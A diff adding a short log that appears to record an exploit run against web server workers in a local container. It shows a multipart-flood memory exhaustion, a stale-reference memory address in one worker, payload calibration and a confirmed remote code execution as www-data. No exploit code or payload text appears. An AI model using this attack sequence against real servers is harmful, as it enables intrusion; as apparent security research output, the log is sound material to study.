@@ -1,0 +1,14 @@
+[*] workers: 17,18,19,20,21,29,30,31,32,33 ingress=172.18.0.3:80
+[*] A2: multipart flood OOM
+    resp_len=357 oom=YES
+[+] stale reference in worker 33 hsv=0x7fff718c2220 page_off=0x220
+[*] globals neutralized on 33 (calibration safe)
+    cal try 1: 48 strings on worker 33 -> index 39 covers hsv page
+[*] globals restored on 33; firing payload (cmd 61 bytes)
+    payload try 1: resp_len=309 pwned=YES
+[+] RCE confirmed: /tmp/pwned =>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+bb2688fc01f3
+
+[*] summary: stale_worker=33 cal_tries=1 pl_tries=1
